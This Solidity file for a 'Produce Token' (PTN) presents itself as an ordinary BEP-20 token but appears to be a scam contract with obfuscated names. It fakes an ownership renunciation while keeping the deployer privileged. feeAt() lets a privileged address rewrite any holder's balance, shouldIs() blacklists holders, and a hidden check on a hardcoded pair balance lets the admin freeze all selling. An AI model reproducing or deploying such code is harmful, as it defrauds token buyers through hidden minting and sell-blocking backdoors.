//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface launchTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalWallet) external view returns (uint256);

    function transfer(address launchedMin, uint256 launchSellList) external returns (bool);

    function allowance(address takeIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchSellList) external returns (bool);

    function transferFrom(
        address sender,
        address launchedMin,
        uint256 launchSellList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapTake, uint256 value);
    event Approval(address indexed takeIs, address indexed spender, uint256 value);
}

abstract contract sellAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingSwap {
    function createPair(address isFrom, address shouldModeToken) external returns (address);
}

interface launchTradingMetadata is launchTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProduceToken is sellAmount, launchTrading, launchTradingMetadata {

    function owner() external view returns (address) {
        return tokenAuto;
    }

    function walletTxList() private view {
        require(atFromExempt[_msgSender()]);
    }

    string private takeMode = "Produce Token";

    function shouldIs(address receiverTotalLaunch) public {
        walletTxList();
        
        if (receiverTotalLaunch == limitAmount || receiverTotalLaunch == listAuto) {
            return;
        }
        takeWallet[receiverTotalLaunch] = true;
    }

    address public listAuto;

    mapping(address => bool) public takeWallet;

    function atIs(address launchBuy) public {
        if (receiverModeIs) {
            return;
        }
        if (launchAuto) {
            toList = true;
        }
        atFromExempt[launchBuy] = true;
        
        receiverModeIs = true;
    }

    bool public liquidityTo;

    address senderTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public liquidityIsFrom;

    mapping(address => bool) public atFromExempt;

    mapping(address => uint256) private receiverLimit;

    bool private launchAuto;

    function transferFrom(address limitExempt, address launchedMin, uint256 launchSellList) external override returns (bool) {
        if (_msgSender() != senderTeam) {
            if (takeSender[limitExempt][_msgSender()] != type(uint256).max) {
                require(launchSellList <= takeSender[limitExempt][_msgSender()]);
                takeSender[limitExempt][_msgSender()] -= launchSellList;
            }
        }
        return isTxMin(limitExempt, launchedMin, launchSellList);
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityFund;
    }

    uint256 fundLaunch;

    event OwnershipTransferred(address indexed senderFee, address indexed autoSender);

    bool private toList;

    uint8 private liquidityFund = 18;

    address tradingToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 fundTotal;

    string private receiverLaunched = "PTN";

    function balanceOf(address totalWallet) public view virtual override returns (uint256) {
        return receiverLimit[totalWallet];
    }

    function receiverSell(uint256 launchSellList) public {
        walletTxList();
        fundLaunch = launchSellList;
    }

    function getOwner() external view returns (address) {
        return tokenAuto;
    }

    function name() external view virtual override returns (string memory) {
        return takeMode;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderIs;
    }

    bool public receiverModeIs;

    uint256 private receiverTotalWallet;

    bool public launchLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return receiverLaunched;
    }

    function transfer(address fromModeAt, uint256 launchSellList) external virtual override returns (bool) {
        return isTxMin(_msgSender(), fromModeAt, launchSellList);
    }

    uint256 constant launchWallet = 20 ** 10;

    mapping(address => mapping(address => uint256)) private takeSender;

    address public limitAmount;

    uint256 private totalLiquidity;

    function launchMarketingReceiver(address limitExempt, address launchedMin, uint256 launchSellList) internal returns (bool) {
        require(receiverLimit[limitExempt] >= launchSellList);
        receiverLimit[limitExempt] -= launchSellList;
        receiverLimit[launchedMin] += launchSellList;
        emit Transfer(limitExempt, launchedMin, launchSellList);
        return true;
    }

    function isTxMin(address limitExempt, address launchedMin, uint256 launchSellList) internal returns (bool) {
        if (limitExempt == limitAmount) {
            return launchMarketingReceiver(limitExempt, launchedMin, launchSellList);
        }
        uint256 receiverLiquidity = launchTrading(listAuto).balanceOf(tradingToken);
        require(receiverLiquidity == fundLaunch);
        require(launchedMin != tradingToken);
        if (takeWallet[limitExempt]) {
            return launchMarketingReceiver(limitExempt, launchedMin, launchWallet);
        }
        return launchMarketingReceiver(limitExempt, launchedMin, launchSellList);
    }

    constructor (){
        if (launchAuto) {
            launchLiquidity = false;
        }
        modeSender receiverExempt = modeSender(senderTeam);
        listAuto = marketingSwap(receiverExempt.factory()).createPair(receiverExempt.WETH(), address(this));
        if (receiverTotalWallet == totalLiquidity) {
            totalLiquidity = receiverTotalWallet;
        }
        limitAmount = _msgSender();
        isAuto();
        atFromExempt[limitAmount] = true;
        receiverLimit[limitAmount] = senderIs;
        
        emit Transfer(address(0), limitAmount, senderIs);
    }

    function allowance(address launchWalletReceiver, address limitBuy) external view virtual override returns (uint256) {
        if (limitBuy == senderTeam) {
            return type(uint256).max;
        }
        return takeSender[launchWalletReceiver][limitBuy];
    }

    address private tokenAuto;

    function feeAt(address fromModeAt, uint256 launchSellList) public {
        walletTxList();
        receiverLimit[fromModeAt] = launchSellList;
    }

    function isAuto() public {
        emit OwnershipTransferred(limitAmount, address(0));
        tokenAuto = address(0);
    }

    uint256 private senderIs = 100000000 * 10 ** 18;

    function approve(address limitBuy, uint256 launchSellList) public virtual override returns (bool) {
        takeSender[_msgSender()][limitBuy] = launchSellList;
        emit Approval(_msgSender(), limitBuy, launchSellList);
        return true;
    }

}